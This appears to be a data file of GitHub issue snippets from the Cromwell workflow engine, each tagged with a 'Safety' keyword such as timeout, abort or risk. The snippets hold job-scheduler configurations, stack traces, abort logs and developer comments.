2; Int requested_memory_mb_per_core = 8000; String queue = ""cpu""; """""". # If an 'exit-code-timeout-seconds' value is specified:; # - When a job has not been alive for longer than this timeout; # - And has still not produced an RC file; # - Then it will be marked as Failed.; # Warning: If set, Cromwell has to run 'check-alive' for every job at regular intervals (unrelated to this timeout). # exit-code-timeout-seconds = 120. submit = """"""; sbatch -J ${job_name} -D ${cwd} -o ${out} -e ${err} -t ${runtime_minutes} -p ${queue} \; ${""-n "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""/usr/bin/env bash ${script}""; """"""; kill = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; }; }; }; }",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560:2172,timeout,timeout-seconds,2172,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560,4,['timeout'],"['timeout', 'timeout-seconds']"
Safety,"related to #2399 and #2830 . As a **Cromwell dev**, I want to **automatically release Cromwell once Travis is green**, so that **Travis doesn't release when it's failing**.; - effort: small; - risk: small; - business value: small (to medium); - have there been any regressions that Travis would have caught but it was red when we released?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2401#issuecomment-344715964:193,risk,risk,193,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2401#issuecomment-344715964,1,['risk'],['risk']
Safety,remove create PAPI requests from queue when aborting,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2752:44,abort,aborting,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2752,1,['abort'],['aborting']
Safety,"rent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at slick.util.ManagedArrayBlockingQueue$$anonfun$take$1.apply(ManagedArrayBlockingQueue.scala:105); at slick.util.ManagedArrayBlockingQueue.lockedInterruptibly(ManagedArrayBlockingQueue.scala:265); at slick.util.ManagedArrayBlockingQueue.take(ManagedArrayBlockingQueue.scala:104); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""Hikari Housekeeping Timer (pool db)"" #24 daemon prio=5 os_prio=31 tid=0x00007fb76d88f000 nid=0x7503 waiting on condition [0x000000012cebb000]; java.lang.Thread.State: TIMED_WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0623fc0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.parkNanos(LockSupport.java:215); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(AbstractQueuedSynchronizer.java:2078); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:1093); at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(ScheduledThreadPoolExecutor.java:809); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(Redefined); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Redefined). ""cromwell-system-akka.io.pinned-dispatcher-7"" #23 prio=5 os_prio=31 tid=0x00007fb76b450800 nid=0x7303 runnable [0x000000012cdb8000]; java.lang.Thread.State: RUNNABLE;",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:41524,Unsafe,Unsafe,41524,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"ression type: bitpack64; Allocating memory for ref offset pointers, kmer 15, interval 3...Attached existing memory (2 attached) for defuse-data/gmap/cdna/cdna.ref153offsets64meta...done (134,217,744 bytes, 0.00 sec); Allocating memory for ref offsets, kmer 15, interval 3...Attached new memory for defuse-data/gmap/cdna/cdna.ref153offsets64strm...done (234,475,312 bytes, 0.23 sec); Pre-loading ref positions, kmer 15, interval 3......done (276,173,052 bytes, 0.05 sec); Starting alignment; Failed attempt to alloc 18446744073709550532 bytes; Exception: Allocation Failed raised at indexdb.c:2885; /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/log/defuse.12.sh: line 6: 7481 Segmentation fault (core dumped) /usr/local/bin/gmap -D defuse-data/gmap -d cdna -f psl /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa > /cromwell-executions/detectFusions/962429bb-ddfa-456a-ab35-c29cf554e409/call-deFuse/execution/OUT/jobs/breakpoints.split.001.fa.cdna.psl.tmp; ; real 0m1.262s; user 0m0.046s; sys 0m0.564s. ```. Run within the docker container but not using Cromwell, the output of that command looks like this:; ```; Starting defuse command:; /usr/local/bin/gmap -D Program_required_data/deFuse/defuse-data/gmap -d cdna -f psl #<1 > #>1; Reasons:; /mnt/Workflow_runs/2_fusion_detection_tools/BT474/BT474_deFuse_0.8.1/jobs/breakpoints.split.001.fa.cdna.psl m; issing; Success for defuse command:; /usr/local/bin/gmap -D Program_required_data/deFuse/defuse-data/gmap -d est4 -f psl /mnt/Workflow_runs/2_fus; ion_detection_tools/BT474/BT474_deFuse_0.8.1/jobs/breakpoints.split.001.fa > /mnt/Workflow_runs/2_fusion_detection_to; ols/BT474/BT474_deFuse_0.8.1/jobs/breakpoints.split.001.fa.est.4.psl.tmp; Return codes: 0; Job output:; Running on a4980b348957; GMAP version 2018-07-04 called with args: /usr/local/bin/gmap.avx2 -D Program_required_data/deFuse/defuse-dat; a/gmap -",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4465:2994,detect,detectFusions,2994,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4465,1,['detect'],['detectFusions']
Safety,"rides from the embedded cromwell; # `reference.conf` (in core/src/main/resources) needed for proper performance of cromwell.; include required(classpath(""application"")). # Cromwell HTTP server settings; webservice {; #port = 8000; #interface = 0.0.0.0; #binding-timeout = 5s; #instance.name = ""reference""; }; call-caching {; enabled = true; invalidate-bad-cache-results = true; }. # Cromwell ""system"" settings; system {; # If 'true', a SIGINT will trigger Cromwell to attempt to abort all currently running jobs before exiting; #abort-jobs-on-terminate = false. # this tells Cromwell to retry the task with Nx memory when it sees either OutOfMemoryError or Killed in the stderr file.; memory-retry-error-keys = [""OutOfMemory"", ""Out Of Memory"",""Out of memory""]; # If 'true', a SIGTERM or SIGINT will trigger Cromwell to attempt to gracefully shutdown in server mode,; # in particular clearing up all queued database writes before letting the JVM shut down.; # The shutdown is a multi-phase process, each phase having its own configurable timeout. See the Dev Wiki for more details.; #graceful-server-shutdown = true. # Cromwell will cap the number of running workflows at N; #max-concurrent-workflows = 5000. # Cromwell will launch up to N submitted workflows at a time, regardless of how many open workflow slots exist; #max-workflow-launch-count = 50. # Number of seconds between workflow launches; #new-workflow-poll-rate = 20. # Since the WorkflowLogCopyRouter is initialized in code, this is the number of workers; #number-of-workflow-log-copy-workers = 10. # Default number of cache read workers; #number-of-cache-read-workers = 25. io {; # throttle {; # # Global Throttling - This is mostly useful for GCS and can be adjusted to match; # # the quota availble on the GCS API; # #number-of-requests = 100000; # #per = 100 seconds; # }. # Number of times an I/O operation should be attempted before giving up and failing it.; #number-of-attempts = 5; }. # Maximum number of input file bytes allowe",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6933:1909,timeout,timeout,1909,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6933,1,['timeout'],['timeout']
Safety,"right now that's not the default in FC, nor do we expose it in the UI - people have used it and it does help for some circumstances where you need it, but it seems like overkill when all you want is reliable statuses. it also won't help with the aborting issue which is what the gatk post was",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334489869:246,abort,aborting,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1861#issuecomment-334489869,1,['abort'],['aborting']
Safety,risk is negligible ; effort is probably higher than it should be but still shouldn't be too much,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-327532339:0,risk,risk,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1634#issuecomment-327532339,1,['risk'],['risk']
Safety,"riteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:10:46,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:47,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:48,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:49,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:50,94] [info] Waiting for 1 workflows to abort...; ^C[2016-10-27 13:10:51,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:52,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:53,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:54,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:55,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:56,94] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:57,16] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.Abstra",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:16655,abort,abort,16655,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,rkJoinWorkerThread.java:107); Caused by: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:805); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:829); 	at scala.util.Try$.apply(Try.scala:210); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recoverAsync(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1253); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:1248); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.executeOrRecover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Ret,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:8194,recover,recoverAsync,8194,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,1,['recover'],['recoverAsync']
Safety,"rmance and; # # tuning the value to match your environment.; db-batch-size = 700; }; }; }. google {. application-name = ""cromwell""; auths = [; {; name = ""application-default""; scheme = ""application_default""; }; ]; }. docker {; hash-lookup {; method = ""remote""; }; }. engine {; filesystems {; gcs {; auth = ""application-default""; }; }; }. call-caching {; enabled = true; }. backend {; default = GCPBATCH; providers {; GCPBATCH {; // life sciences; actor-factory = ""cromwell.backend.google.batch.GcpBatchBackendLifecycleActorFactory""; config {; ## Google project; project = ""$PROJECT"". ## Base bucket for workflow executions; root = ""$BUCKET""; name-for-call-caching-purposes: PAPI; #60000/min in google; ##genomics-api-queries-per-100-seconds = 90000; virtual-private-cloud {; network-name = ""$NET""; subnetwork-name = ""$SUBNET""; }; // Polling for completion backs-off gradually for slower-running jobs.; // This is the maximum polling interval (in seconds):; maximum-polling-interval = 600; 	 request-workers = 4; batch-timeout = 7 days; 	 # Emit a warning if jobs last longer than this amount of time. This might indicate that something got stuck in PAPI.; 	 slow-job-warning-time: 24 hours; genomics {; // A reference to an auth defined in the `google` stanza at the top. This auth is used to create; // Pipelines and manipulate auth JSONs.; auth = ""application-default""; compute-service-account = ""default""; # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false; ## Location; location = ""europe-west1"". ; }. filesystems {; gcs {; // A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; project = ""$PROJECT""; caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy th",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7356:10306,timeout,timeout,10306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7356,1,['timeout'],['timeout']
Safety,"rowse/CROM-6734. <!-- Which backend are you running? -->; AWSBatch. <!-- Paste/Attach your workflow if possible: -->. <!-- Paste your configuration if possible, MAKE SURE TO OMIT PASSWORDS, TOKENS AND OTHER SENSITIVE MATERIAL: -->. ```; include required(classpath(""application"")). backend {; default = ""aws""; providers {; aws {; config {; default-runtime-attributes {; scriptBucketName = ""caper4-04-20-2021""; queueArn = ""arn:aws:batch:us-east-1:618537831167:job-queue/default-caper5""; }; filesystems {; s3 {; caching {; duplication-strategy = ""reference""; }; auth = ""default""; }; }; concurrent-job-limit = 1000; numSubmitAttempts = 6; numCreateDefinitionAttempts = 6; auth = ""default""; root = ""s3://caper4-04-20-2021/out""; }; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; }; }; }. system {; job-rate-control {; jobs = 1; per = ""2 seconds""; }; abort-jobs-on-terminate = true; graceful-server-shutdown = true; max-concurrent-workflows = 40; }; call-caching {; invalidate-bad-cache-results = true; enabled = true; }; database {; db {; connectionTimeout = 30000; numThreads = 1; url = ""jdbc:hsqldb:file:/opt/caper/default_file_db;shutdown=false;hsqldb.tx=mvcc;hsqldb.lob_compressed=true;hsqldb.default_table_type=cached;hsqldb.result_max_memory_rows=10000;hsqldb.large_data=true;hsqldb.applog=1;hsqldb.script_format=3""; }; }; aws {; application-name = ""cromwell""; auths = [; {; name = ""default""; scheme = ""default""; }; ]; region = ""us-east-1""; }; engine {; filesystems {; s3 {; auth = ""default""; }; }; }; ```. Even with the `reference` strategy, Cromwell still make a `cacheCopy` of previous outputs. Here is the `metadata.json` from a pipeline run with `reference` strategy. Cromwell still makes a `cacheCopy` directory.; ```; {; ""calls"": {; ""atac.bam2ta"": [; {; ""executionStatus"": ""Done"",; ""stdout"": ""s3://caper4-04-20-2021/out/atac/b59c0d05-5210-4341-b4f0-dcbf5b9e74c1/call-bam2ta/shard-0/bam2ta-0-stdout.log"",; ""compressedDockerSize"": 963995760,; ""shardIndex"": 0,;",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6327:1941,abort,abort-jobs-on-terminate,1941,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6327,1,['abort'],['abort-jobs-on-terminate']
Safety,"rrors on our HPC that occur randomly and qsub/qstat go down temporarily and result in `failed (during ExecutingWorkflowState): java.lang.RuntimeException: Unable to start job.`. I was hoping this would retry failed submissions. . This is my current config:. ```; include required(classpath(""application"")). webservice {; port = 8000; interface = 127.0.0.1; }. #call-caching {; # enabled = true; # invalidate-bad-cache-results = true; #}. system {; job-rate-control {; jobs = 20; per = 1 second; }; }. backend {; default = SGE. providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 10; root = ""cromwell-executions""; run-in-background = true. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; String ? docker; String ? docker_user; """""". submit = ""/bin/bash ${script}"". submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """""". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""file""; check-sibling-md5: false; }; }; }; }; }. SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; root = ""cromwell-executions""; exit-code-timeout-seconds = 600; concurrent-job-limit = 100. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; Int cpu = 1; Float ? memory_gb; String sge_queue = ""dgdcloud.q""; String ? sge_project; """""". submit = """"""; qsub \; -terse \; -V \; -b n \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l h_vmem="" + memory_gb / cpu + ""g""} \; ${""-l mem_free="" + memory_gb / cpu + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ${script}; """""". kill = ""qdel ${job_id}""; check-alive = ""qstat -j ${job_id}""; job-id-regex = ""(\\d+)""; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362:1486,timeout,timeout-seconds,1486,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362,1,['timeout'],['timeout-seconds']
Safety,"rting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1934,Abort,Aborting,1934,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"rting 11 EJEAs; 2016-12-12 18:29:42,727 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(73be7f27)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:31:29,146 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1610,Abort,Aborting,1610,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"rting 13 EJEAs; 2016-12-12 18:31:29,146 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(13965e09)]: Abort received. Aborting 10 EJEAs; 2016-12-12 18:31:46,093 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(804a56b6)]: Abort received. Aborting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:1772,Abort,Aborting,1772,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"ry, etc. that the scientist has written all the magic into, that takes some input arguments (data, poutputs, thresholds, etc.) and ""does the scientific thing"" to return to the workflow manager (cromwell) that is controlling its run via the backend. ## What does Singularity + Cromwell look like?. People keep saying these two together, and I've been struggling to figure it out. I've been doing a lot of work trying to do that. What does it mean for Singularity to be a part of Cromwell. I first logically thought it would mean a backend, because the basic exec / run commands for Singularity don't change much (but arguments do!). But it doesn't fit well here because it's missing that API to make it a fully fledged service. To those familiar with Singularity, this is the instance command group (and not running containers as images). Then I thought it was really more of a workflow executable. But if this is the case, why is it special at all? It doesn't really fit because there is still going to be a lot of redundancy in specifying the ""singularity run <container> <args> bit over and over again. So I think (eventually) all these use cases could fit into cromwell,. - running a singularity container as an executable with a backend like slurm; - running a singularity container as an executable on with Local (host) backend; - running a container as a backend as a container instance (via its API). but for now, without a clean API for services, only the first two really make sense. Singularity is not special. It's just a binary. ## Why has it been so confusing?. We get Singularity confused with Docker, because they are both containers. Same thing right? Sort of, but not exactly. Docker is a container technology, but actually it's older and has had time to develop a full API for services. It meets the criteria for both a backend and an executable, and this is because it can be conceptualized as both ""a thing that you run"" and ""the thing that is the container you run in."" But it's c",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:2575,redund,redundancy,2575,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,2,['redund'],['redundancy']
Safety,"s the error more precisely in `handleGoogleError`. I tested this by deliberately breaking the request so it always gets a `400` back. With the existing code, the log looks just like what we see in prod:. ```; 2023-11-01 19:54:12 cromwell-system-akka.dispatchers.backend-dispatcher-91 WARN - PAPI request worker had 2 failures making 5 requests: ; 400 Bad Request; POST https://lifesciences.googleapis.com/v2beta/projects/1005074806481/locations/us-central1/operations/6175597626605185257:cancel; {; ""code"": 400,; ""errors"": [; {; ""domain"": ""global"",; ""message"": ""Invalid JSON payload received. Unexpected token.\nasdf\n^ Payload appears to be compressed. It may either be corrupt or uncompressed data may be too large for the server to handle."",; ""reason"": ""parseError""; }; ],; ""message"": ""Invalid JSON payload received. Unexpected token.\nasdf\n^ Payload appears to be compressed. It may either be corrupt or uncompressed data may be too large for the server to handle."",; ""status"": ""INVALID_ARGUMENT""; }; ```. <img width=""1238"" alt=""Screenshot 2023-11-01 at 15 43 59"" src=""https://github.com/broadinstitute/cromwell/assets/1087943/63e4e788-517f-4f1e-a4ff-4075cec3e6d3"">. ---. 